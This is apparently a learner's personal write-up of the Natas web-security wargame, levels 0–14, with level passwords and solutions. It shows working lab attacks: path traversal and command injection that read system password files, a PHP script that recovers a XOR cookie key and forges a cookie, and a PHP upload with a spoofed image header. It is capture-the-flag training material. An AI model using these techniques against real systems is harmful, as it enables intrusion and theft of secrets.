so lets do natas again. I reached natas 30 but I did use AI for some levels. Like after trying ofc.

###### natas0
natas0
natas0
The pass was hidden as a commend in the HTML code.

###### natas1
natas1
scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7
The pass was in the same place, but rightclick was blocked. F12.

###### natas2
natas2
vsDOxoXyq3wckCP1ZmTZ71ngIA606odB
Pass was hidden in the /files/ subdirectory. there as an image called pixel.png and the directory was open. pass was inside users.txt

###### natas3
natas3
K30JrSRHzjxq3paUQuwozY4MNvmNFyhI
I went to the robots.txt file since it was a clue from the "not even Google will find it"
subdirectory /secrets/ or whatever and the pass was there

###### natas4
natas4
JDrPnuZAKyl6MkiqQGFIddrqpvgOASth

Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
I am thinking about changing/adding the referrer with burp suite.
yep: Access granted. The password for natas5 is e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M

###### natas5
natas5
e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
There is a cookie called loggedin with a value of 0. Changed it to 1 and got:
Access granted. The password for natas6 is 7mhjtShJAcld2NYbKHEadnhEwRn2P8VT

###### natas6
natas6
7mhjtShJAcld2NYbKHEadnhEwRn2P8VT

We get a screen with an input and submit form. No cookies.
Maybe a command injection? maybe lets just call nataspass?
i tried " echo file_get_contents(/etc/natas_webpass/natas7");
the input is a text in a function. we need to break out of that function. Thats a command injection?
I am a dumbass, there is source code for this level.
It seems like we need to manipulate and use secret.inc
or... just open it?
[natas6.natas.labs.overthewire.org/includes/secret.inc](http://natas6.natas.labs.overthewire.org/includes/secret.inc)
FOEIUWGHFEEUHOFUOIU
Access granted. The password for natas7 is B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0
So far no code. lol.

###### natas7
natas7
B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0

[natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8](http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8)
ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc
solved in 10 seconds.

###### natas8
natas8
ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc

we have this php code:
  
`$encodedSecret = "3d3d516343746d4d6d6c315669563362";`  
  
`function encodeSecret($secret) {`  
    `return bin2hex(strrev(base64_encode($secret)));`  
`}`  
  
`if(array_key_exists("submit", $_POST)) {`  
    `if(encodeSecret($_POST['secret']) == $encodedSecret) {`  
    `print "Access granted. The password for natas9 is <censored>";`  
    `} else {`  
    `print "Wrong secret";`  
    `}`  
`}`  

decode and submit the secret.

decode base64 - strrev - hex2bin

lets run it in php online even just for good measure.

`<?php`

`function decodeSecret() {`
    `$encodedSecret = "3d3d516343746d4d6d6c315669563362";`

    `$decodedSecret = base64_decode(strrev(hex2bin($encodedSecret)));`

    `return $decodedSecret;`
`}`

`echo decodeSecret();`
`?>`

output: oubWYf2kBq
Access granted. The password for natas9 is UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9

###### natas9
natas9
UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9

`<?`  
`$key = "";`  
  
`if(array_key_exists("needle", $_REQUEST)) {    $key = $_REQUEST["needle"];`  
`}`  
  
`if($key != "") {    passthru("grep -i $key dictionary.txt");`  
`}`  
`?>`

Code Injection!

&cat /etc/natas_webpass/natas10
With burp suite for fuzzing.

EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv

###### natas10
natas10
EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv

it seems like they are filtering some characters now.
no  \`

http://natas10.natas.labs.overthewire.org/?needle=%0Acat%20/etc/natas_webpass/natas11&submit=Search
after some fuzzing with burpsuite.
VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd

###### natas11
natas11
VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd
(27.6.26 12:56)
We have an interface where I can change the background color.
it saves the data in a cookie named "data". It is encryped with XOR encryption.
From reading the code at first glance (and I am not a great programmer by any means), I think the data has both fields for background color and show password = false/no/whatever.
I think I will try to decrypt it using what I know, I have the encoded text and the data that should be in it, and then to make a cookie with show password = yes.
This is my current approach.
the cookie is built like that:

save data:
json encode - xor encrypt - base64 encode
according to the code, this is the default data in json.
{"showpassword":"no","bgcolor":"#ffffff"}
if we encrypt with the cookie as the key we can calculate the key.
I will do it in php. Why tf am i doing it in php online? meh

I ran this code:
`<?php`
`$key = base64_decode("EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0/GBlgaVVIJDURDSQ1VRY=");`
`$text = '{"showpassword":"no","bgcolor":"#ffffff"}';`
`$outText = '';`

    `// Iterate through each character`
    `for($i=0;$i<strlen($text);$i++) {`
    `$outText .= $text[$i] ^ $key[$i % strlen($key)];`
    `}`

    `print $outText;`
`?>`

output: kBSwkBSwkBSwkBSwkBSwkBSwkBSwkBSwkBSwkBSwk
So the key is kBSw
Now we can create our own cookie!

Code:
`<?php`
`$key = "kBSw";`
`$text = '{"showpassword":"yes","bgcolor":"#ffffff"}';`
`$outText = '';`

    `// Iterate through each character`
    `for($i=0;$i<strlen($text);$i++) {`
    `$outText .= $text[$i] ^ $key[$i % strlen($key)];`
    `}`

    `print base64_encode($outText); // Print as base64 encode ready for cookie`
`?>`

output: EGAgHwQ1IxYYMSQYGSZxTUk7NgRJbnEVDCE8GwQwcU1JYTURDSQ1EUk/
We enter the cookie and we get this!!!
Cookies are protected with XOR encryption  
  
The password for natas12 is EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng

So proud of myself for real! Last time I did this level I couldn't even recreate this with ChatGPT. The trick is to try harder, use the functions you have with php and try to really understand what you need to do.

###### natas12
natas12
EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng

We need to upload a file and then we can view it. RCE?
I created a file with this code: 
`<?php`
`$filename = '/etc/natas_webpass/natas13';`
`$content = file_get_contents($filename);`
`if ($content !== false) {`
    `echo $content;`
`} else {`
    `echo "Error: Could not read file.";`
`}`
`?>`

And captured the http request and edited the file extension from jpg to .php.

output: g8ba0olAzaSJuyS4gnmbdVVigAICLG1k

###### natas13
natas13
g8ba0olAzaSJuyS4gnmbdVVigAICLG1k

For security reasons, we now only accept image files!
Lets change the file header to a photo magic header. I remember this trick from last run, basically the code in this challange checks the header of the file for data to indicate that it's a photo.

output: GIF89a; A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8

###### natas14
natas14
A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
